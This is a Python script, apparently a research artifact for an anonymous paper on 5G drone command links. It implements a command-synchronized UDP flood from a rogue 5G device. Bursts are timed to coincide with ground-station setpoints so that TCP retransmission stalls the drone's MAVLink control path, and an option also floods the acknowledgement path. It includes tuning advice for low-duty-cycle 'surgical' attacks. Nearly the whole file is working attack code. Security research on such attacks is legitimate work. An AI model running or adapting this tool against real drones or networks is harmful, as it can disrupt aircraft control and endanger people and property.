#!/usr/bin/env python3
##################################################################################################################################
# Module: c2_sync_flood.py (command-synchronized UDP flood on rogue pod)                                                         #
# Part of the paper: FlyBlind: Silent State Staleness in UAS Command and Control over 5G                                         #
#                                                                                                                                #
# Author: (anonymous; double-blind submission).                                                                                  #
# Institution: withheld (double-blind review).                                                                                   #
# Date: 2026-11                                                                                                                  #
# License: MIT License                                                                                                           #
#                                                                                                                                #
# Description: Trigger-oracle or open-loop bursts aligned to GCS setpoints; pure-PRB targets ext-DN, legacy ablation targets UAV #
##################################################################################################################################

#!/usr/bin/env python3
"""
Command-synchronized C2 flood on the ROGUE pod (surgical / low duty-cycle).

Two modes
---------
* **trigger-oracle** (default): listen on CNI for a tiny UDP trigger from
  ``mission_runner`` / ``setpoint_stream``; fire one sustained burst per trigger.
  The trigger never traverses 5G — it only coordinates timing.
* **open-loop**: fire at ``--rate-hz`` without GCS oracle (ablation control).

Why bursts, not continuous flood
--------------------------------
C2 is MAVLink over TCP. Contending the command path for ~200–300 ms causes TCP
retransmission + head-of-line blocking exactly when the stream is critical.
~5%% duty cycle keeps aggregate CPU/availability high while concentrating damage
at command coincidence.

Targets
-------
* ``sync-c2`` / ``sync-prb`` (paper): ``--target EXT_DN:5201`` (pure PRB sink)
* Legacy path-endpoint ablation: ``--target UAV:5760`` (forbidden post-L3)

Campaign pitfall: at 10 Hz with ``--burst-ms 250`` bursts overlap → near-continuous
attack. Keep ``--burst-ms <= ~50`` for the surgical ~5%% duty claim.

Usage examples::

  python3 /tmp/c2_sync_flood.py --listen-port 47555 \\
    --target <EXT_DN_IP> --port 5201 --bind <ROGUE_PDU_IP> \\
    --burst-ms 25 --pps 12000 --size 1400 --duration <envelope_s>
"""
from __future__ import annotations

import argparse
import csv
import socket
import sys
import time
from pathlib import Path


BURST_SLICE_S = 0.005  # pacing slice inside each burst (matches co_tenant_burst_sender)
SNDBUF_BYTES = 4 * 1024 * 1024


def _make_sender(bind_ip: str) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SNDBUF_BYTES)
    if bind_ip:
        s.bind((bind_ip, 0))  # egress via 5G tunnel (oaitun_ue1)
    return s


def _burst(sock: socket.socket, dests: list[tuple[str, int]], payload: bytes,
           pps: int, burst_ms: float) -> int:
    """Sustained contention for *burst_ms* at ~pps datagrams/s to cover the full
    command+ACK round-trip (not an instant blast that drains before the ACK returns).
    Sends in 5 ms slices with pacing. Errors (full buffer) are ignored — the goal is
    contention, not delivery."""
    slice_s = BURST_SLICE_S
    per_slice = max(1, int(pps * slice_s))
    end = time.monotonic() + burst_ms / 1000.0
    sent = 0
    i = 0
    n_dests = len(dests)
    while time.monotonic() < end:
        t_slice_end = time.monotonic() + slice_s
        for _ in range(per_slice):
            try:
                sock.sendto(payload, dests[i % n_dests])
                sent += 1
                i += 1
            except OSError:
                pass
        rem = t_slice_end - time.monotonic()
        if rem > 0:
            time.sleep(rem)
    return sent


def _parse_trigger_payload(data: bytes) -> int | None:
    """Payload 'C' (legacy) or 'C|<t0_ns>' (skew). Returns GCS t0_ns if present."""
    try:
        text = (data or b"").decode("ascii", errors="ignore").strip()
    except Exception:
        return None
    if not text:
        return None
    if text == "C":
        return None
    if text.startswith("C|"):
        try:
            return int(text.split("|", 1)[1])
        except ValueError:
            return None
    return None


# --- Skew instrumentation (t0 GCS → t2 trigger recv → t3 burst start) ---


def _open_skew_writer(path: str | None):
    if not path:
        return None, None
    p = Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    f = p.open("w", newline="", encoding="utf-8")
    w = csv.DictWriter(
        f,
        fieldnames=[
            "burst_id",
            "t0_gcs_ns",
            "t2_trigger_recv_ns",
            "t3_burst_start_ns",
            "d_recv_minus_t0_us",
            "d_burst_minus_recv_us",
            "d_burst_minus_t0_us",
            "mode",
        ],
    )
    w.writeheader()
    return f, w


def _write_skew_row(writer, burst_id: int, t0: int | None, t2: int, t3: int, mode: str) -> None:
    if writer is None:
        return
    row = {
        "burst_id": burst_id,
        "t0_gcs_ns": t0 if t0 is not None else "",
        "t2_trigger_recv_ns": t2,
        "t3_burst_start_ns": t3,
        "d_recv_minus_t0_us": "" if t0 is None else round((t2 - t0) / 1000.0, 3),
        "d_burst_minus_recv_us": round((t3 - t2) / 1000.0, 3),
        "d_burst_minus_t0_us": "" if t0 is None else round((t3 - t0) / 1000.0, 3),
        "mode": mode,
    }
    writer.writerow(row)


def main() -> int:
    ap = argparse.ArgumentParser(description="FlyBlind command-synchronized C2 flood")
    ap.add_argument("--listen-port", type=int, default=47555,
                    help="UDP port (CNI) to listen for mission_runner triggers")
    ap.add_argument("--target", required=True, help="UAV PDU IP (command path, UAV DL)")
    ap.add_argument("--port", type=int, default=5760, help="target port (SITL C2)")
    ap.add_argument("--ack-target", default="", help="optional: GCS PDU IP to also contend ACK path (GCS DL)")
    ap.add_argument("--ack-port", type=int, default=5760, help="port on ack-target")
    ap.add_argument("--bind", default="", help="ROGUE PDU IP (source, egress via 5G)")
    ap.add_argument("--burst-ms", type=float, default=250.0, help="duration of each burst")
    ap.add_argument("--pps", type=int, default=20000, help="packets/s during burst (sets burst size)")
    ap.add_argument("--size", type=int, default=1400, help="payload bytes per packet")
    ap.add_argument("--duration", type=float, default=200.0, help="total listener lifetime (s)")
    ap.add_argument("--open-loop", action="store_true",
                    help="no GCS trigger: fire at --rate-hz with --phase-ms")
    ap.add_argument("--rate-hz", type=float, default=10.0,
                    help="open-loop: burst rate (default 10 = setpoint stream)")
    ap.add_argument("--phase-ms", type=float, default=0.0,
                    help="open-loop: initial delay before first burst (ms)")
    ap.add_argument("--skew-log", default="/tmp/sync_skew_rogue.csv",
                    help="skew CSV (t0/t2/t3); empty disables")
    args = ap.parse_args()

    payload = b"\xa5" * max(1, args.size)
    dests = [(args.target, args.port)]
    if args.ack_target:
        dests.append((args.ack_target, args.ack_port))

    sender = _make_sender(args.bind)
    skew_f, skew_w = _open_skew_writer(args.skew_log if args.skew_log else None)

    bursts = 0
    packets = 0
    t_end = time.monotonic() + args.duration

    try:
        if args.open_loop:
            # --- Open-loop: no CNI trigger; fixed phase at rate_hz ---
            if args.rate_hz <= 0:
                print("[ROGUE-SYNC] ERROR: --rate-hz must be > 0", flush=True)
                return 2
            period_s = 1.0 / args.rate_hz
            print(
                "[ROGUE-SYNC] mode=open-loop rate=%.3fHz phase=%.1fms "
                "burst=%.0fms pps=%d size=%dB target=%s:%d bind=%s dur=%.0fs"
                % (args.rate_hz, args.phase_ms, args.burst_ms, args.pps, args.size,
                   args.target, args.port, args.bind or "(default)", args.duration),
                flush=True,
            )
            next_burst = time.monotonic() + max(0.0, args.phase_ms / 1000.0)
            while time.monotonic() < t_end:
                now = time.monotonic()
                if now < next_burst:
                    time.sleep(min(0.01, next_burst - now))
                    continue
                t2 = time.monotonic_ns()  # no trigger; t2≈t3-setup
                t3 = time.monotonic_ns()
                n = _burst(sender, dests, payload, args.pps, args.burst_ms)
                packets += n
                bursts += 1
                _write_skew_row(skew_w, bursts, None, t2, t3, "open-loop")
                dt_ms = (time.monotonic_ns() - t3) / 1e6
                if bursts <= 3 or bursts % 20 == 0:
                    print("[ROGUE-SYNC] burst #%d: %d pkts in %.1fms (open-loop)"
                          % (bursts, n, dt_ms), flush=True)
                next_burst += period_s
                if next_burst < time.monotonic() - period_s:
                    next_burst = time.monotonic() + period_s
        else:
            # --- Trigger-oracle: one burst per mission_runner UDP trigger ---
            listener = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind(("0.0.0.0", args.listen_port))

            print("[ROGUE-SYNC] mode=trigger-oracle ready: listen=:%d target=%s:%d%s bind=%s "
                  "burst=%.0fms pps=%d size=%dB dur=%.0fs skew_log=%s"
                  % (args.listen_port, args.target, args.port,
                     (" ack_target=%s:%d" % (args.ack_target, args.ack_port)) if args.ack_target else "",
                     args.bind or "(default)", args.burst_ms, args.pps, args.size, args.duration,
                     args.skew_log or "(off)"),
                  flush=True)

            while True:
                remaining = t_end - time.monotonic()
                if remaining <= 0:
                    break
                listener.settimeout(min(remaining, 1.0))
                try:
                    data, _addr = listener.recvfrom(256)
                except socket.timeout:
                    continue
                except OSError:
                    continue
                t2 = time.monotonic_ns()
                t0 = _parse_trigger_payload(data)
                # Drain extra triggers that arrived in a burst (counts as 1 burst).
                listener.setblocking(False)
                while True:
                    try:
                        listener.recvfrom(256)
                    except (BlockingIOError, OSError):
                        break
                listener.setblocking(True)
                t3 = time.monotonic_ns()
                n = _burst(sender, dests, payload, args.pps, args.burst_ms)
                packets += n
                bursts += 1
                _write_skew_row(skew_w, bursts, t0, t2, t3, "oracle")
                dt_ms = (time.monotonic_ns() - t3) / 1e6
                if bursts <= 3 or bursts % 20 == 0:
                    extra = ""
                    if t0 is not None:
                        extra = " skew_t3-t0=%.1fus" % ((t3 - t0) / 1000.0)
                    print("[ROGUE-SYNC] burst #%d: %d pkts in %.1fms%s"
                          % (bursts, n, dt_ms, extra), flush=True)
    finally:
        if skew_f is not None:
            try:
                skew_f.flush()
                skew_f.close()
            except OSError:
                pass

    print("[ROGUE-SYNC] done: bursts=%d pkts=%d bytes≈%d"
          % (bursts, packets, packets * args.size), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
